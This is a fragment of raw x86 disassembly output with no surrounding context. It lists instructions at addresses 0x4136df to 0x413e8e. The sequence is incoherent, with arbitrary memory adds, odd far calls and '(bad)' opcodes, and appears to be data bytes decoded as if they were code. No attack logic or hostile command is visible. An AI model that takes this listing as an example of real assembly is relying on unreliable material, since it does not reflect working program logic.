  4136df:	or     BYTE PTR [eax],dl
  4136e1:	push   eax
  4136e2:	lock adc BYTE PTR [eax],dl
  4136e5:	sbb    BYTE PTR [ecx+eax*2],0x4
  4136e9:	popa   
  4136ea:	add    cl,BYTE PTR [ecx]
  4136ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136ed:	inc    eax
  4136ee:	add    BYTE PTR ds:0x24200e2,dl
  4136f4:	adc    dl,al
  4136f6:	push   eax
  4136f7:	mov    eax,ds:0x840093
  4136fc:	pusha  
  4136fd:	xor    ch,BYTE PTR [eax]
  4136ff:	popa   
  413700:	mov    bh,BYTE PTR [eax]
  413702:	popf   
  413703:	adc    BYTE PTR ds:0xf5c0080,cl
  413709:	inc    eax
  41370a:	add    al,al
  41370c:	add    ah,BYTE PTR [eax+0x6]
  41370f:	add    BYTE PTR ss:[eax+0xa0181],al
  413716:	inc    esp
  413717:	and    BYTE PTR [eax+0x20c8240b],al
  41371d:	or     ebp,ecx
  41371f:	inc    ecx
  413720:	push   ebp
  413721:	inc    eax
  413722:	mov    ah,0x92
  413724:	xor    al,0x0
  413726:	xchg   ebp,eax
  413727:	mov    dh,0xff
  413729:	adc    eax,0x429464
  41372e:	and    ebx,DWORD PTR [eax+0x4a40a148]
  413734:	push   0x65
  413736:	or     BYTE PTR [eax],al
  413738:	add    BYTE PTR [esi],al
  41373a:	nop
  41373b:	add    DWORD PTR [edx],edx
  41373d:	add    DWORD PTR [eax],eax
  41373f:	inc    eax
  413740:	and    BYTE PTR [eax+0x4],0xc2
  413744:	or     BYTE PTR [eax+0x50],al
  413747:	or     al,0x87
  413749:	mov    ds:0xaa050028,eax
  41374e:	add    al,BYTE PTR [edx]
  413750:	add    eax,DWORD PTR [edx]
  413752:	push   es
  413753:	adc    BYTE PTR [esp+eax*4+0x20],dh
  413757:	mov    al,0xd2
  413759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41375a:	adc    BYTE PTR [eax-0x7a77fee0],al
  413760:	add    BYTE PTR [eax],al
  413762:	or     al,BYTE PTR [eax+eax*8-0x7c]
  413766:	test   DWORD PTR [esp+edi*4],ebx
  413769:	or     eax,DWORD PTR [eax]
  41376b:	add    BYTE PTR [edx],dl
  41376d:	and    DWORD PTR [esi+0x2],eax
  413770:	pop    eax
  413771:	rol    BYTE PTR [eax+0x38881115],0xa0
  413778:	loopne 0x41377e
  41377a:	add    bh,BYTE PTR [eax]
  41377c:	adc    BYTE PTR [edx],dl
  41377e:	add    al,BYTE PTR [ecx+0x8bc000]
  413784:	or     BYTE PTR [eax+eax*4+0x77c80065],0x40
  41378c:	add    BYTE PTR [eax-0x73fd7e4c],al
  413792:	xchg   edx,eax
  413793:	add    BYTE PTR [edx+0x30114098],0x88
  41379a:	add    BYTE PTR [edx+0x6a540354],al
  4137a0:	mov    cl,0x1
  4137a2:	inc    eax
  4137a3:	or     BYTE PTR [eax],ah
  4137a5:	and    al,BYTE PTR [edi]
  4137a7:	add    BYTE PTR [eax],ch
  4137a9:	inc    eax
  4137aa:	xor    bl,BYTE PTR [ecx]
  4137ac:	inc    ecx
  4137ad:	or     al,0x8
  4137af:	add    al,0x20
  4137b1:	push   esp
  4137b2:	mov    ds:0x52d00008,al
  4137b7:	test   DWORD PTR [eax],esp
  4137b9:	sub    cl,BYTE PTR [ebp+0x4]
  4137bc:	adc    BYTE PTR [edx+esi*1],ch
  4137bf:	add    eax,0x22001352
  4137c4:	fldenv [eax]
  4137c6:	sbb    BYTE PTR [eax+edx*2],ah
  4137c9:	daa    
  4137ca:	adc    BYTE PTR [eax+eax*1+0x2],dh
  4137ce:	sbb    ch,BYTE PTR [eax]
  4137d0:	push   0x2288420a
  4137d5:	sub    ch,BYTE PTR [edx]
  4137d7:	add    eax,0x3060a000
  4137dc:	sbb    BYTE PTR [eax],cl
  4137de:	mov    ah,al
  4137e0:	add    al,0x5
  4137e2:	push   es
  4137e3:	and    BYTE PTR [edx+0x4910400b],cl
  4137e9:	test   BYTE PTR [esp+edx*1+0x80008ad],dh
  4137f0:	adc    BYTE PTR [edx],0x68
  4137f3:	or     BYTE PTR [eax],ah
  4137f5:	adc    BYTE PTR [eax],ah
  4137f7:	inc    ecx
  4137f8:	add    al,BYTE PTR [eax]
  4137fa:	add    BYTE PTR [eax+0x5048a100],ch
  413800:	add    BYTE PTR [eax+0x8],0x21
  413804:	add    BYTE PTR [eax+0x6b01051],ah
  41380a:	add    ah,al
  41380c:	inc    eax
  41380d:	or     BYTE PTR [ebx],0x81
  413810:	mov    WORD PTR [eax],es
  413812:	or     dl,BYTE PTR [eax+0x1073825]
  413818:	or     BYTE PTR [eax+0x4],al
  41381b:	or     esp,DWORD PTR [ecx+0x10]
  41381e:	xor    BYTE PTR [eax+0x1c],al
  413821:	add    BYTE PTR [eax],cl
  413823:	adc    BYTE PTR [ecx],cl
  413825:	data16 adc BYTE PTR [esi],al
  413828:	jb     0x41384b
  41382a:	inc    eax
  41382b:	add    BYTE PTR [ecx-0x6f],dl
  41382e:	bound  esp,QWORD PTR [eax+eax*1]
  413831:	push   ds
  413832:	adc    BYTE PTR [eax+0x36],al
  413835:	ret    0x508
  413838:	add    BYTE PTR [esi],0x2
  41383b:	test   DWORD PTR [eax],eax
  41383d:	add    BYTE PTR [esi],ah
  41383f:	mov    al,ds:0x4c240300
  413844:	push   ecx
  413845:	inc    eax
  413846:	cwde   
  413847:	add    BYTE PTR [eax-0x76beffc0],cl
  41384d:	push   esp
  41384e:	jns    0x4137dc
  413850:	sbb    BYTE PTR [edx],dl
  413852:	lds    eax,FWORD PTR [eax]
  413854:	push   esp
  413855:	adc    DWORD PTR [eax+edi*8],ecx
  413858:	es inc eax
  41385a:	loope  0x41385d
  41385c:	or     dl,BYTE PTR [ecx+0x50200022]
  413862:	push   ecx
  413863:	add    DWORD PTR [eax+0x4],esp
  413866:	push   esp
  413867:	push   eax
  413868:	add    BYTE PTR [edx],0x10
  41386b:	and    esp,DWORD PTR [edx+0x6e632231]
  413871:	sbb    eax,0xc080c28
  413876:	and    BYTE PTR [eax],0xb0
  413879:	add    al,0x8c
  41387b:	inc    ebp
  41387c:	push   esp
  41387d:	and    eax,0x80100240
  413882:	test   al,0x4
  413884:	push   es
  413885:	adc    BYTE PTR [eax],al
  413887:	test   al,0xc
  413889:	or     BYTE PTR [eax],al
  41388b:	add    al,0x0
  41388d:	add    BYTE PTR [ecx+0x30380],cl
  413893:	add    dh,BYTE PTR [eax]
  413895:	dec    ebp
  413896:	inc    esi
  413897:	clc    
  413898:	add    dh,BYTE PTR [ebp+ecx*2+0x2021a801]
  41389f:	add    edi,DWORD PTR [edx+eax*2-0x5a]
  4138a3:	adc    al,0x0
  4138a5:	ror    BYTE PTR [eax],1
  4138a7:	dec    eax
  4138a8:	add    DWORD PTR [ebx+0x30c646a0],eax
  4138ae:	add    cl,BYTE PTR [ebx]
  4138b0:	push   ecx
  4138b1:	add    al,0x5
  4138b3:	arpl   WORD PTR [eax],ax
  4138b5:	sbb    al,0x84
  4138b7:	add    al,0xb6
  4138b9:	push   esp
  4138ba:	sbb    BYTE PTR [eax+0x35334838],al
  4138c0:	add    BYTE PTR [eax-0x58],al
  4138c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138c4:	test   DWORD PTR [ecx],esp
  4138c6:	add    BYTE PTR [ebx],al
  4138c8:	and    bl,BYTE PTR [ecx]
  4138ca:	add    al,0x1b
  4138cc:	or     DWORD PTR [ebx],eax
  4138ce:	pop    eax
  4138cf:	xchg   esp,eax
  4138d0:	sbb    DWORD PTR [ecx+ecx*1+0x6004029],esp
  4138d7:	add    BYTE PTR [ecx],dl
  4138d9:	test   al,0x1
  4138db:	add    al,0x1
  4138dd:	or     BYTE PTR [ecx],0x1
  4138e0:	ret    0x8c02
  4138e3:	and    eax,0x4502000
  4138e8:	xor    al,BYTE PTR [eax-0x7f8f87de]
  4138ee:	add    dl,BYTE PTR [eax+0x14980208]
  4138f4:	and    BYTE PTR [ebx],dl
  4138f6:	add    dl,BYTE PTR [esi]
  4138f8:	add    edx,eax
  4138fa:	or     eax,0x3130c043
  4138ff:	ins    BYTE PTR es:[edi],dx
  413900:	inc    eax
  413901:	push   es
  413902:	push   eax
  413903:	rol    BYTE PTR [eax+edx*2],1
  413906:	mov    eax,0x94108c15
  41390b:	dec    ebx
  41390c:	loope  0x41388e
  41390e:	add    eax,DWORD PTR [eax+0x8300006]
  413914:	adc    cl,BYTE PTR [eax]
  413916:	inc    eax
  413917:	or     DWORD PTR [ebx],esi
  413919:	inc    ecx
  41391a:	or     BYTE PTR [eax],ah
  41391c:	adc    bl,BYTE PTR [edx]
  41391e:	inc    eax
  41391f:	add    eax,0x90000d32
  413924:	inc    eax
  413925:	add    DWORD PTR [ecx],eax
  413927:	add    BYTE PTR [eax+0x43002100],0x2
  41392e:	inc    esp
  41392f:	add    al,0x42
  413931:	adc    al,0x80
  413933:	or     BYTE PTR [ecx],ah
  413935:	add    BYTE PTR [edx+eax*2],al
  413938:	inc    eax
  413939:	and    al,0x15
  41393b:	add    DWORD PTR [ecx+eax*4],esp
  41393e:	and    DWORD PTR [edx],0x2030002c
  413944:	in     eax,0x1
  413946:	adc    cl,cl
  413948:	add    BYTE PTR [eax+0x400028c7],ah
  41394e:	sub    DWORD PTR [ecx],ebp
  413950:	and    DWORD PTR [edx-0x67fedffa],edx
  413956:	rcl    BYTE PTR [eax+0x40006110],0x6
  41395d:	inc    eax
  41395e:	adc    BYTE PTR [eax+0x4501000],dh
  413964:	add    BYTE PTR [eax+eax*1+0x30],al
  413968:	add    ebp,DWORD PTR [eax]
  41396a:	xor    DWORD PTR [eax],0x11
  41396d:	xor    BYTE PTR [eax],cl
  41396f:	sbb    BYTE PTR [eax],al
  413971:	inc    eax
  413972:	cwde   
  413973:	adc    BYTE PTR [eax],bl
  413975:	or     BYTE PTR [eax+0x6260c400],0x0
  41397c:	or     eax,edx
  41397e:	and    BYTE PTR [ebx],ah
  413980:	add    dl,BYTE PTR [edx]
  413982:	and    DWORD PTR [edx],edx
  413984:	pop    es
  413985:	add    al,0xc5
  413987:	pop    ebp
  413988:	shr    BYTE PTR [eax],0x20
  41398b:	in     al,0x28
  41398d:	test   BYTE PTR [eax+0x5],dl
  413990:	rol    DWORD PTR [eax-0x752cfef6],0x9
  413997:	mov    al,0x20
  413999:	add    BYTE PTR [edx],ah
  41399b:	adc    DWORD PTR [ebp+0x24304e0],ebx
  4139a1:	add    BYTE PTR [ecx],al
  4139a3:	mov    al,0x1
  4139a5:	and    BYTE PTR es:[eax],0x2
  4139a9:	or     ah,al
  4139ab:	inc    esi
  4139ac:	add    al,BYTE PTR [edi+0x102a3891]
  4139b2:	add    BYTE PTR [eax],al
  4139b4:	sub    al,0x8
  4139b6:	xor    al,0x60
  4139b8:	add    eax,0x2105011
  4139bd:	mov    BYTE PTR [eax],al
  4139bf:	and    DWORD PTR [eax+0x48],ecx
  4139c2:	and    BYTE PTR [ecx+0x2c03084c],al
  4139c8:	or     BYTE PTR [eax],0x84
  4139cb:	inc    eax
  4139cc:	adc    dl,BYTE PTR [eax]
  4139ce:	adc    BYTE PTR [eax-0x57f3f9fa],0x28
  4139d5:	fadd   DWORD PTR [eax+0x0]
  4139d8:	mov    BYTE PTR [eax+0x1],al
  4139db:	test   BYTE PTR [ecx],al
  4139dd:	or     BYTE PTR [eax],dl
  4139df:	pusha  
  4139e0:	and    al,0x30
  4139e2:	add    BYTE PTR [edx],0x4
  4139e5:	or     BYTE PTR [edx],ah
  4139e7:	mov    al,ds:0x88009d10
  4139ec:	adc    BYTE PTR [ecx+0x49401],ah
  4139f2:	cmp    BYTE PTR [eax+0x4],ah
  4139f5:	adc    al,BYTE PTR [eax]
  4139f7:	add    DWORD PTR [ebx-0x58],0x21
  4139fb:	add    BYTE PTR [eax+0x10],cl
  4139fe:	add    BYTE PTR [eax+edx*2+0x4c1000c0],bh
  413a05:	push   cs
  413a06:	inc    eax
  413a07:	sub    BYTE PTR [ebx+0x8960910],ah
  413a0d:	inc    eax
  413a0e:	push   ss
  413a0f:	inc    ecx
  413a10:	push   cs
  413a11:	inc    ebp
  413a12:	or     BYTE PTR [eax],al
  413a14:	or     BYTE PTR [ecx],ah
  413a16:	add    BYTE PTR [eax],ch
  413a18:	or     BYTE PTR [eax],dl
  413a1a:	or     BYTE PTR [eax],al
  413a1c:	add    DWORD PTR ds:0x1014a104,ecx
  413a22:	add    BYTE PTR [ecx],cl
  413a24:	add    BYTE PTR [esi+0x6051a06b],0x76
  413a2b:	mov    esp,0x20009200
  413a30:	inc    eax
  413a31:	add    BYTE PTR [eax+esi*1+0x8900420],al
  413a38:	jl     0x413a1a
  413a3a:	adc    BYTE PTR [eax],ch
  413a3c:	add    BYTE PTR [ecx+eax*1],cl
  413a3f:	ret    0xa068
  413a42:	add    BYTE PTR [ecx+0x20],al
  413a45:	xor    dh,BYTE PTR [esi]
  413a47:	sbb    eax,0x4429c000
  413a4c:	mov    BYTE PTR [ecx+0x21],cl
  413a4f:	and    BYTE PTR [esi],dl
  413a51:	add    BYTE PTR [eax],ah
  413a53:	sub    DWORD PTR [ecx],ebp
  413a55:	and    BYTE PTR [eax],0x42
  413a58:	pusha  
  413a59:	and    BYTE PTR [eax],bl
  413a5b:	add    al,0x18
  413a5d:	add    DWORD PTR [ecx],0xffffff84
  413a60:	or     DWORD PTR [eax+0x4],edx
  413a63:	ins    BYTE PTR es:[edi],dx
  413a64:	adc    al,0x48
  413a66:	and    BYTE PTR [edx+eax*1],cl
  413a69:	and    DWORD PTR [ebp+eax*1+0x6c],ecx
  413a6d:	and    al,0x23
  413a6f:	inc    ecx
  413a70:	inc    ebx
  413a71:	inc    ecx
  413a72:	and    BYTE PTR [eax+esi*1],al
  413a75:	mov    ah,0x8
  413a77:	add    DWORD PTR [esi],eax
  413a79:	pusha  
  413a7a:	or     BYTE PTR [eax],dl
  413a7c:	pop    es
  413a7d:	inc    eax
  413a7e:	or     edx,DWORD PTR ds:0xa3088a84
  413a84:	and    DWORD PTR [eax],0x48116acc
  413a8a:	mov    cl,0x20
  413a8c:	or     cl,BYTE PTR [eax+eax*2]
  413a8f:	add    cl,BYTE PTR [eax+0x12761030]
  413a95:	xor    DWORD PTR [edx],esp
  413a97:	xchg   ecx,eax
  413a98:	push   esp
  413a99:	or     BYTE PTR [eax],dl
  413a9b:	add    ecx,DWORD PTR [eax+0x24]
  413a9e:	and    al,BYTE PTR [ecx]
  413aa0:	call   0x4458:0xc34026
  413aa7:	mov    ds:0x20081406,eax
  413aac:	xor    dh,BYTE PTR [eax]
  413aae:	rcl    DWORD PTR [edx-0x6b65ffaf],0x0
  413ab5:	xchg   esp,eax
  413ab6:	mov    eax,ds:0x80e04a14
  413abb:	or     BYTE PTR [ebx],dh
  413abd:	or     eax,0x475384
  413ac2:	add    DWORD PTR [ecx],eax
  413ac4:	add    bl,cl
  413ac6:	or     eax,DWORD PTR [eax+eax*2+0x21048c01]
  413acd:	add    DWORD PTR [ebp+0x11],ebx
  413ad0:	and    cl,BYTE PTR [eax+ecx*1-0x6f3fce00]
  413ad7:	dec    eax
  413ad8:	mov    ds:0x826038,eax
  413add:	and    DWORD PTR [ecx],esp
  413adf:	mov    eax,ds:0x108aa38
  413ae4:	or     dl,al
  413ae6:	xchg   esp,eax
  413ae7:	push   eax
  413ae8:	push   esp
  413ae9:	or     ch,al
  413aeb:	or     BYTE PTR [eax],al
  413aed:	push   0x9e90200
  413af2:	dec    edx
  413af3:	sbb    al,0x8c
  413af5:	adc    BYTE PTR [eax],dl
  413af7:	cmp    ah,BYTE PTR [eax+0x0]
  413afa:	rol    BYTE PTR [eax+0x8580408],0x20
  413b01:	add    BYTE PTR [eax+0x0],0xa4
  413b05:	add    BYTE PTR [ecx],0x62
  413b08:	add    BYTE PTR [eax],cl
  413b0a:	adc    BYTE PTR [ecx],0x20
  413b0d:	popa   
  413b0e:	adc    BYTE PTR [eax],cl
  413b10:	adc    al,0x80
  413b12:	adc    dl,BYTE PTR [eax]
  413b14:	int    0x0
  413b16:	xor    BYTE PTR [edx-0x3d65f200],dl
  413b1c:	and    al,BYTE PTR [eax+0x65]
  413b1f:	inc    eax
  413b20:	adc    eax,0x2929024
  413b25:	add    DWORD PTR [ecx+0x45902414],edx
  413b2b:	adc    al,0x14
  413b2d:	mov    al,ds:0x4010000
  413b32:	inc    ebp
  413b33:	cmp    DWORD PTR [esi],ebp
  413b35:	add    BYTE PTR [esi],al
  413b37:	dec    edi
  413b38:	cwde   
  413b39:	mov    al,ds:0xa8000040
  413b3e:	mov    al,BYTE PTR [eax]
  413b40:	add    BYTE PTR [esi+0x61400410],dl
  413b46:	add    BYTE PTR [ecx],al
  413b48:	and    BYTE PTR [eax],ah
  413b4a:	dec    ebp
  413b4b:	adc    BYTE PTR [eax+0x211801c4],cl
  413b51:	add    BYTE PTR [ecx],ch
  413b53:	mov    WORD PTR [edx],es
  413b55:	or     eax,0x380c50
  413b5a:	add    al,BYTE PTR [edx]
  413b5c:	add    BYTE PTR [eax+0x1200a8d0],ah
  413b62:	adc    cl,BYTE PTR [eax]
  413b64:	or     BYTE PTR [edx+eax*1],dl
  413b67:	and    ah,BYTE PTR [ecx+0x8]
  413b6a:	add    DWORD PTR [eax],ecx
  413b6c:	add    al,BYTE PTR [eax+0xa]
  413b6f:	pusha  
  413b70:	or     DWORD PTR [ecx+edx*2],0x5c309000
  413b77:	inc    ecx
  413b78:	inc    esi
  413b79:	mov    WORD PTR [eax],es
  413b7b:	and    BYTE PTR [edx],al
  413b7d:	sbb    al,0x42
  413b7f:	or     BYTE PTR [esi+0x2622088],cl
  413b85:	or     al,0x2
  413b87:	cmp    BYTE PTR [ebp-0x78],0x23
  413b8b:	les    ecx,FWORD PTR [eax]
  413b8d:	inc    ecx
  413b8e:	add    BYTE PTR [edx+eax*1+0x26060f],ch
  413b95:	push   eax
  413b96:	dec    eax
  413b97:	push   eax
  413b98:	and    al,0x0
  413b9a:	ror    BYTE PTR [eax],cl
  413b9c:	add    DWORD PTR [esi+0x20a12010],edx
  413ba2:	and    DWORD PTR [ebx],ecx
  413ba4:	dec    eax
  413ba5:	mov    al,0x3e
  413ba7:	inc    eax
  413ba8:	inc    edi
  413ba9:	xor    BYTE PTR [edx+esi*4],al
  413bac:	lock inc eax
  413bae:	add    DWORD PTR ds:0x34812031,eax
  413bb4:	add    BYTE PTR [eax+0x23],cl
  413bb7:	add    DWORD PTR [eax+0x28],esi
  413bba:	add    BYTE PTR [ebp+ecx*2-0x40],bl
  413bbe:	inc    eax
  413bbf:	enter  0x1c2,0xe0
  413bc3:	inc    ecx
  413bc4:	rol    BYTE PTR [ebx+0x9ad8812],1
  413bca:	adc    BYTE PTR [esi],cl
  413bcc:	push   ecx
  413bcd:	inc    eax
  413bce:	and    al,al
  413bd0:	adc    BYTE PTR [edx+eax*1+0x142c474],0x8
  413bd8:	xchg   DWORD PTR [ecx],eax
  413bda:	adc    BYTE PTR [ebx],al
  413bdc:	mov    BYTE PTR [eax],dl
  413bde:	mov    BYTE PTR [ecx],al
  413be0:	pop    es
  413be1:	xchg   ecx,eax
  413be2:	pop    esp
  413be3:	push   eax
  413be4:	and    BYTE PTR [eax],al
  413be6:	add    DWORD PTR [edx-0x70],edx
  413be9:	add    al,BYTE PTR [eax]
  413beb:	or     DWORD PTR [edi],esp
  413bed:	xor    BYTE PTR [eax+0x8540043],al
  413bf3:	push   edx
  413bf4:	inc    esp
  413bf5:	add    al,0x40
  413bf8:	add    BYTE PTR [ecx],ah
  413bfa:	add    DWORD PTR [ecx+0x40],edi
  413bfd:	jo     0x413c42
  413bff:	add    al,BYTE PTR [eax]
  413c01:	push   es
  413c02:	or     eax,0x531273a
  413c07:	and    BYTE PTR [eax],0x0
  413c0a:	and    DWORD PTR [eax-0x70],esp
  413c0d:	xor    BYTE PTR ds:0xc820ac,al
  413c13:	add    BYTE PTR [eax-0x1a],al
  413c16:	add    BYTE PTR [ecx-0x40],al
  413c19:	and    eax,0x25203d
  413c1e:	dec    esp
  413c1f:	add    dl,BYTE PTR [ebx]
  413c21:	or     dl,0x81
  413c24:	add    cl,BYTE PTR [edx]
  413c26:	add    BYTE PTR [edx],dl
  413c28:	add    al,0x0
  413c2a:	mov    al,0x1
  413c2c:	mov    bl,0x2
  413c2e:	dec    eax
  413c2f:	inc    eax
  413c30:	shl    DWORD PTR [eax],1
  413c32:	sub    DWORD PTR [esp+0x44],ebx
  413c36:	adc    DWORD PTR [eax],ecx
  413c38:	add    BYTE PTR [edx],al
  413c3a:	push   eax
  413c3b:	add    ah,BYTE PTR [eax+0x1]
  413c3e:	dec    eax
  413c3f:	add    BYTE PTR [esi],0x80
  413c42:	add    dl,BYTE PTR [ecx]
  413c44:	add    BYTE PTR ds:[ebx],bl
  413c47:	xor    eax,0x8c680412
  413c4c:	ss pop es
  413c4e:	or     BYTE PTR ds:0x90100001,al
  413c54:	xchg   edx,eax
  413c55:	nop
  413c56:	rol    BYTE PTR [eax],1
  413c58:	pop    edx
  413c59:	add    BYTE PTR [ecx],ah
  413c5b:	add    BYTE PTR [eax],ah
  413c5d:	xchg   edx,eax
  413c5e:	sbb    eax,0x60241891
  413c63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c64:	and    DWORD PTR [eax],0x15412008
  413c6a:	mov    eax,ds:0x20889bc0
  413c6f:	and    al,BYTE PTR [eax+eiz*1]
  413c72:	adc    BYTE PTR [eax+ecx*1],ah
  413c75:	adc    BYTE PTR [edx+0x1c],0x50
  413c79:	xor    al,al
  413c7b:	mov    ch,0x20
  413c7d:	push   ecx
  413c7e:	push   es
  413c7f:	add    eax,DWORD PTR [eax]
  413c81:	push   es
  413c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c83:	or     eax,DWORD PTR [eax]
  413c85:	inc    eax
  413c86:	add    eax,0x53040248
  413c8b:	add    BYTE PTR [eax+0x15722ea9],cl
  413c91:	and    BYTE PTR [edx+edx*8],cl
  413c94:	and    BYTE PTR [eax],al
  413c96:	push   es
  413c97:	and    BYTE PTR [ebx+0x0],al
  413c9a:	(bad)  
  413c9b:	and    al,0x1
  413c9d:	add    BYTE PTR [eax+eiz*4],ch
  413ca0:	add    BYTE PTR [edx],ah
  413ca2:	add    ecx,DWORD PTR [eax]
  413ca4:	add    eax,DWORD PTR ds:0x50a49102
  413caa:	or     ecx,DWORD PTR [ecx+0x12]
  413cad:	add    DWORD PTR ds:0x15024081,esp
  413cb3:	and    al,BYTE PTR [ecx]
  413cb5:	ret    0x0
  413cb8:	inc    eax
  413cb9:	je     0x413cfb
  413cbb:	es inc esp
  413cbd:	or     al,BYTE PTR [eax+eax*4-0x5ce5f615]
  413cc4:	mov    BYTE PTR ds:0x481000c4,al
  413cca:	inc    edx
  413ccb:	dec    ecx
  413ccc:	sub    ecx,DWORD PTR [eax+0x132540be]
  413cd2:	add    eax,0x62420830
  413cd7:	add    BYTE PTR [eax],0x48
  413cda:	or     BYTE PTR [ecx],cl
  413cdc:	or     BYTE PTR [ecx],al
  413cde:	jno    0x413cf5
  413ce0:	inc    edx
  413ce1:	add    BYTE PTR [eiz*1+0x52a840ac],cl
  413ce8:	adc    al,BYTE PTR [edx+0x40]
  413ceb:	and    BYTE PTR [ecx+0x4c02011],al
  413cf1:	add    BYTE PTR [edx],al
  413cf3:	add    al,0x93
  413cf5:	xor    BYTE PTR [esi],dl
  413cf7:	add    al,BYTE PTR [eax]
  413cf9:	fs push 0x2
  413cfc:	adc    BYTE PTR [edx],0x84
  413cff:	inc    eax
  413d00:	sub    ecx,eax
  413d02:	call   0x6408:0x8a346500
  413d09:	xor    eax,DWORD PTR [eax]
  413d0b:	dec    ecx
  413d0c:	push   es
  413d0d:	add    al,BYTE PTR [edx]
  413d0f:	adc    al,0x5
  413d11:	add    BYTE PTR [edx],ch
  413d13:	push   ss
  413d14:	inc    ebx
  413d15:	and    BYTE PTR [ecx+0x99c40a4],al
  413d1b:	sar    BYTE PTR [eax],cl
  413d1d:	rcl    DWORD PTR [eax],0x84
  413d20:	add    al,0x80
  413d22:	push   ds
  413d23:	add    BYTE PTR [ecx],ah
  413d25:	fs call 0xb4613f2b
  413d2b:	mov    al,ds:0x603ce410
  413d30:	add    BYTE PTR [esi+0x71],al
  413d33:	test   al,0x2c
  413d35:	add    BYTE PTR [ecx+0x8],al
  413d38:	add    DWORD PTR [edx],esp
  413d3a:	adc    BYTE PTR [eax],bh
  413d3c:	adc    BYTE PTR [eax+edx*2],al
  413d3f:	add    BYTE PTR [esp+eax*1+0x19],al
  413d43:	or     ah,BYTE PTR [eax]
  413d45:	inc    eax
  413d46:	or     DWORD PTR [eax+0x40],esi
  413d49:	or     BYTE PTR [esi+0x53000408],al
  413d4f:	pop    ds
  413d50:	and    BYTE PTR [eax+0x38],dh
  413d53:	add    DWORD PTR [ecx],0x20041400
  413d59:	sub    BYTE PTR [eax+eax*1],ah
  413d5c:	mov    ah,0xa4
  413d5e:	adc    BYTE PTR [edx],dl
  413d60:	or     BYTE PTR [ecx+0x248a1b48],al
  413d66:	add    al,0x8
  413d68:	sti    
  413d69:	ficom  DWORD PTR [edx]
  413d6b:	sbb    dh,BYTE PTR [eax-0x515b577f]
  413d71:	or     al,0x0
  413d73:	xor    al,0x0
  413d75:	pop    ecx
  413d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d77:	rol    BYTE PTR [edx],0x80
  413d7a:	and    BYTE PTR [edx],cl
  413d7c:	add    eax,DWORD PTR [ebx+0x44]
  413d7f:	or     al,0x1
  413d81:	pop    eax
  413d82:	pusha  
  413d83:	or     BYTE PTR [esi],0x29
  413d86:	adc    BYTE PTR [esp+eax*4],bl
  413d89:	aam    0x3
  413d8b:	sbb    edx,DWORD PTR [eax]
  413d8d:	add    BYTE PTR [esi+0x4],al
  413d90:	and    DWORD PTR [edx-0x6e],ebx
  413d93:	add    BYTE PTR [ecx-0x3b],bl
  413d96:	mov    ebx,0x64604055
  413d9b:	sub    DWORD PTR [ecx],0xffffff89
  413d9e:	add    DWORD PTR [ecx+ebx*1],esp
  413da1:	inc    ecx
  413da2:	push   eax
  413da3:	add    DWORD PTR [eax+edi*2],edx
  413da6:	or     BYTE PTR [edx+0x40128940],al
  413dac:	or     BYTE PTR [ecx],cl
  413dae:	inc    ecx
  413daf:	addr16 adc ebx,ecx
  413db2:	and    BYTE PTR [ecx+0x10],ah
  413db5:	dec    eax
  413db6:	add    DWORD PTR [ecx],ecx
  413db8:	popa   
  413db9:	inc    eax
  413dba:	xor    al,0x1
  413dbc:	add    al,BYTE PTR [ecx+0x10c82102]
  413dc2:	xor    BYTE PTR [eax],al
  413dc4:	add    ah,BYTE PTR [eax]
  413dc6:	or     DWORD PTR [ecx+eax*1],ecx
  413dc9:	sbb    al,BYTE PTR [eax+edx*4]
  413dcc:	pusha  
  413dcd:	pop    ecx
  413dce:	xor    DWORD PTR [eax+eiz*4+0xc],0xffffffc4
  413dd3:	push   es
  413dd4:	sub    BYTE PTR [edx-0x7f],al
  413dd7:	or     BYTE PTR [edi],ah
  413dd9:	add    BYTE PTR [eax-0x7d],cl
  413ddc:	and    al,0x0
  413dde:	sub    BYTE PTR [eax],al
  413de0:	add    eax,0xa0850100
  413de5:	add    BYTE PTR ds:0x10004884,al
  413deb:	loop   0x413d73
  413ded:	push   es
  413dee:	xor    eax,0x20208140
  413df3:	adc    DWORD PTR [ecx+eax*1],eax
  413df6:	add    al,0x25
  413df8:	and    BYTE PTR [ebx],al
  413dfa:	add    dl,BYTE PTR [eax]
  413dfc:	mov    BYTE PTR [eax+0x400929],cl
  413e02:	test   BYTE PTR [eax+0x18],al
  413e05:	add    eax,0x80730009
  413e0a:	add    BYTE PTR [eax+edx*1+0x19120214],bl
  413e11:	push   es
  413e12:	adc    BYTE PTR [ecx+edx*1+0x14e49214],al
  413e19:	add    al,ch
  413e1b:	int3   
  413e1c:	add    DWORD PTR [eax+0x40c40809],0x60403060
  413e26:	xor    BYTE PTR [eax+0x41],al
  413e29:	and    BYTE PTR [eax],ah
  413e2b:	or     ecx,DWORD PTR [eax]
  413e2d:	and    BYTE PTR [esi+eiz*1],al
  413e30:	nop
  413e31:	adc    al,0xa
  413e33:	test   BYTE PTR [eax+0x880905],al
  413e39:	and    DWORD PTR [ebx],ebx
  413e3b:	push   es
  413e3c:	or     BYTE PTR [eax-0x1fbffdf5],al
  413e42:	push   es
  413e43:	nop
  413e44:	add    al,BYTE PTR [eax]
  413e46:	inc    edx
  413e47:	les    eax,FWORD PTR [edx]
  413e49:	test   BYTE PTR [edx+0x8],dh
  413e4c:	call   0x4200:0x2bc50022
  413e53:	adc    DWORD PTR [eax+eiz*4+0x104048],eax
  413e5a:	imul   eax,DWORD PTR [ecx],0x4000a
  413e60:	and    BYTE PTR [eax],al
  413e62:	mov    dh,BYTE PTR [eax+0x2a]
  413e65:	adc    ah,al
  413e67:	push   ss
  413e68:	inc    esp
  413e69:	lea    eax,[eax]
  413e6b:	inc    ebp
  413e6c:	add    BYTE PTR [ebx+0x20],dl
  413e6f:	add    ah,BYTE PTR [eax]
  413e71:	add    al,0xe0
  413e73:	and    BYTE PTR [eax],ch
  413e75:	cmp    eax,0x88001048
  413e7a:	nop
  413e7b:	sub    DWORD PTR [eax],esp
  413e7d:	inc    ecx
  413e7e:	test   BYTE PTR ds:0x10418422,ah
  413e84:	or     BYTE PTR [edx],al
  413e86:	or     al,BYTE PTR [eax]
  413e88:	add    BYTE PTR ds:0x8d480088,ch
  413e8e:	shl    BYTE PTR [ecx+eax*2],0x31
